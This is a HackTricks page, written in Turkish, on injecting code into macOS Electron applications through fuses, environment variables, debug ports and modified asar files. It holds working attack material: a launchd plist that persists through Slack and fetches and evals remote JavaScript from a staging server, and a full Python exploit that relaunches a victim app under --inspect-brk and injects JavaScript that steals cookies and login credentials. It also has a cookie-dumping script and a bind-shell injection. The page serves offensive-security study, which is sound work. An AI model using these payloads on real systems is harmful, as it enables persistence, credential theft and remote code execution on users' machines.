# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Electron'ın ne olduğunu bilmiyorsanız [**burada birçok bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ancak şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterlidir.\
Ayrıca node'un, belirtilen dosyanın dışında **başka kodlar çalıştırmasını sağlamak** için kullanılabilecek bazı **parametreleri** ve **env değişkenleri** vardır.

### Electron Fuses

Bu teknikler ileride ele alınacaktır, ancak son zamanlarda Electron bunları **önlemek için çeşitli güvenlik flag'leri ekledi**. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'ta Electron uygulamalarının **keyfi kod yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[1]</sup>

- **`RunAsNode`**: Devre dışı bırakılırsa, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını önler.
- **`EnableNodeCliInspectArguments`**: Devre dışı bırakılırsa, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece kod enjekte etmenin bu yolu engellenir.
- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirilirse, yüklenen **`asar`** **file**, macOS tarafından **doğrulanır**. Böylece bu dosyanın içeriğini değiştirerek gerçekleştirilen **code injection** önlenir.
- **`OnlyLoadAppFromAsar`**: Etkinleştirilirse, aşağıdaki arama ve yükleme sırası yerine: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar dosyasını kontrol eder ve kullanır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış kodun yüklenmesi** imkansız hale gelir.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirilirse, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.

Kod injection'ını önlemeyen başka bir ilginç fuse ise:

- **EnableCookieEncryption**: Etkinleştirilirse, disk üzerindeki cookie store, işletim sistemi düzeyindeki cryptography anahtarları kullanılarak şifrelenir.

### Electron Fuses'larını Kontrol Etme

Bu flag'leri bir uygulamadan şu şekilde **kontrol edebilirsiniz**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses'i Değiştirme

[**docs belirtildiği gibi**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini barındıran **Electron binary** dosyasının içinde yapılandırılır.<sup>[1]</sup>

macOS uygulamalarında bu genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) üzerinde açıp önceki string'i arayabilirsiniz. Bu string'den sonra ASCII olarak, her fuse'un devre dışı mı yoksa etkin mi olduğunu belirten bir "0" veya "1" görebilirsiniz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` değeridir) değiştirmeniz yeterlidir.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Bu şekilde değiştirilmiş byte'lar içeren bir uygulamanın içindeki **`Electron Framework` binary** dosyasını **overwrite** etmeye çalışırsanız uygulamanın çalışmayacağını unutmayın.

## Electron Applications'a kod ekleyerek RCE

Bir Electron App'in kullandığı **external JS/HTML files** olabilir. Bu nedenle bir attacker, signature'ı kontrol edilmeyen bu dosyalara code inject edebilir ve app context'inde arbitrary code execute edebilir.

> [!CAUTION]
> Ancak şu anda 2 sınırlama vardır:
>
> - Bir App'i modify etmek için **`kTCCServiceSystemPolicyAppBundles`** permission'ı **gereklidir**; dolayısıyla varsayılan olarak bu artık mümkün değildir.
> - Compiled **`asap`** file genellikle **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuse'larını **enabled** olarak içerir.
>
> Bu durum attack path'i daha karmaşık (veya imkansız) hale getirir.

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini, application'ı başka bir directory'ye (örneğin **`/tmp`**) copy ederek, **`app.app/Contents`** folder'ını **`app.app/NotCon`** olarak rename ederek, **`asar`** file'ını **malicious** code ile modify ederek, yeniden **`app.app/Contents`** olarak rename edip execute ederek bypass etmek mümkündür.

Code'u asar file'ından şu komutla unpack edebilirsiniz:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE ile RCE

[**dokümantasyona**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) göre, bu environment variable ayarlanırsa process'i normal bir Node.js process'i olarak başlatır.<sup>[6]</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> **`RunAsNode`** fuse'u devre dışıysa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu çalışmaz.

### App Plist'ten Injection

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kalıcılığı sürdürmek için bir plist içindeki bu env var'ı abuse edebilirsiniz:<sup>[2]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` ile RCE

Payload'u farklı bir dosyada depolayıp çalıştırabilirsiniz:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışıysa**, uygulama başlatıldığında **`ELECTRON_RUN_AS_NODE`** ortam değişkeni ayarlanmadığı sürece **NODE_OPTIONS** env var'ını **yok sayar**; fuse **`RunAsNode`** devre dışıysa bu değişken de **yok sayılır**.
>
> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **hatayı** alırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist'ten Injection

Persistence sağlamak için bir plist dosyasındaki bu env var'ı kötüye kullanarak aşağıdaki anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspecting ile RCE

[**bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, bağlanabileceğiniz bir **debug portu açılır** (örneğin Chrome'daki `chrome://inspect` üzerinden) ve bu porta **code enjekte** edebilir, hatta yeni process'ler başlatabilirsiniz.<sup>[7]</sup>\
Örneğin:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**bu blogpost**](https://hackerone.com/reports/1274695), bu debugging, headless chrome'un **herhangi bir dosyayı herhangi bir konuma indirmesini** sağlamak için abuse ediliyor.<sup>[8]</sup>

> [!TIP]
> Bir app'in env variables veya `--inspect` gibi parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendine özgü bir yöntemi varsa, `--inspect-brk` arg'ını kullanarak bunu runtime'da **bypass** etmeyi deneyebilirsiniz. Bu arg, **app'in başlangıcında execution'ı durdurur** ve bir bypass çalıştırmanıza olanak tanır (örneğin mevcut process'in args veya env variables değerlerini overwrite ederek).

Aşağıdaki exploit'te, app'i `--inspect-brk` parametresiyle monitoring ve execution ederek sahip olduğu custom protection'ı bypass etmek mümkün oluyordu (`--inspect-brk` parametresini kaldırmak için process'in params değerlerini overwrite ederek) ve ardından app'ten cookies ve credentials dump etmek için bir JS payload inject ediliyordu:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> **`EnableNodeCliInspectArguments`** fuse'u devre dışıysa, **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece uygulama başlatıldığında **node parametrelerini** (örneğin `--inspect`) **yoksayar**; fuse **`RunAsNode`** devre dışıysa bu değişken de **yoksayılır**.
>
> Ancak yine de **`--remote-debugging-port=9229`** **electron parametresini** kullanabilirsiniz, fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.

**`--remote-debugging-port=9222`** parametresini kullanarak Electron App'ten **history** (GET komutlarıyla) veya browser'ın **cookies**'leri gibi bazı bilgileri çalmak mümkündür (bunlar browser'ın içinde **decrypted** durumdadır ve bunları sağlayan bir **json endpoint** bulunur).

Bunu nasıl yapacağınızı [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir; otomatik [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) aracını veya aşağıdakine benzer basit bir script'i kullanabilirsiniz:<sup>[9][10]</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist'inden Injection

Persistence sağlamak için bir plist içindeki bu env variable'ı kötüye kullanarak şu anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Eski Sürümleri kötüye kullanarak TCC Bypass

> [!TIP]
> macOS'taki TCC daemon'u uygulamanın çalıştırılan sürümünü kontrol etmez. Bu nedenle, önceki tekniklerden herhangi biriyle **bir Electron application içine code inject edemiyorsanız**, APP'nin önceki bir sürümünü indirip code inject edebilirsiniz; çünkü bu sürüm yine TCC privileges alacaktır (Trust Cache bunu engellemediği sürece).

## JS Olmayan Code Çalıştırma

Önceki teknikler, **Electron application process'i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process'lerin parent application ile aynı sandbox profile altında çalıştığını ve TCC permissions'larını devraldığını** unutmayın.\
Bu nedenle, örneğin camera veya microphone'a erişmek için entitlements'ı kötüye kullanmak istiyorsanız, **process'ten başka bir binary çalıştırmanız** yeterlidir.

## Dikkate Değer Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` folder'ına write access'i olan bir attacker'ın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses'larını bypass etmesine olanak tanıyordu. Bug, integrity checker'daki bir *file-type confusion* sorunuydu; bu sorun, validate edilmiş archive yerine **`app.asar` adında hazırlanmış bir directory'nin** yüklenmesine izin veriyordu. Böylece bu directory içine yerleştirilen JavaScript, app başlatıldığında execute ediliyordu. Bu nedenle, hardening guidance'ı izleyen ve her iki fuse'u da enable eden vendor'lar bile macOS'ta hâlâ vulnerable durumdaydı.<sup>[3]</sup>

Patched Electron versions: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran application bulan attacker'lar, application'ın TCC entitlements'larıyla code execute etmek için `Contents/Resources/app.asar`'ı kendi directory'leriyle overwrite edebilir.<sup>[3]</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster'ı

Ocak 2024'te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron app'inin **RunAsNode** ve **EnableNodeCliInspectArguments** fuses'ları hâlâ enabled şekilde dağıtıldığını ortaya koydu. Bu nedenle local attacker, programı `ELECTRON_RUN_AS_NODE=1` environment variable'ı veya `--inspect-brk` gibi flag'lerle yeniden launch ederek onu *generic* bir Node.js process'ine dönüştürebilir ve application'ın sandbox ve TCC permissions'larının tamamını devralabilir.<sup>[4]</sup>

Electron team'inin “critical” rating'ini tartışmasına ve attacker'ın zaten local code–execution'a ihtiyaç duyduğuna dikkat çekmesine rağmen, bu issue post-exploitation sırasında hâlâ değerlidir; çünkü herhangi bir vulnerable Electron bundle'ını, örneğin desktop app'e daha önce verilen Contacts, Photos veya diğer sensitive resources'ları okuyabilen bir *living-off-the-land* binary'sine dönüştürür.<sup>[4]</sup>

Electron maintainers tarafından sağlanan defensive guidance:<sup>[4]</sup>

* Production build'lerinde `RunAsNode` ve `EnableNodeCliInspectArguments` fuses'larını disable edin.
* Application'ınızın meşru olarak bir helper Node.js process'ine ihtiyaç duyması durumunda, bu fuses'ları yeniden enable etmek yerine daha yeni **UtilityProcess** API'sini kullanın.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool'u, installed durumdaki **vulnerable electron applications'ları bulmak ve bunlara code inject etmek** için kolayca kullanılabilir. Bu tool **`--inspect`** technique'ini kullanmayı dener:

Önce kendiniz compile etmeniz gerekir ve şu şekilde kullanabilirsiniz:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki, Electron uygulamalarının JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştirerek arka kapı yerleştirmek üzere tasarlanmıştır.


## Referanslar

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Üçüncü Taraf Framework'ler üzerinden MacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Dosya türü karmaşası üzerinden ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVE'leri hakkında açıklama - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming cephaneliğinizde yeni bir silah - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron uygulamaları sırlarınızı neden gizli tutamaz: --inspect seçeneği](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging kötüye kullanılarak rastgele dosyalar indirildi](https://hackerone.com/reports/1274695)
- [9] [Cookie Jar'a eller: Chromium'un Remote Debugger Port'u ile Cookie'leri dump etme - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium'un Remote Debugger'ı ile Cookie Dumping hatalarını ayıklama - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
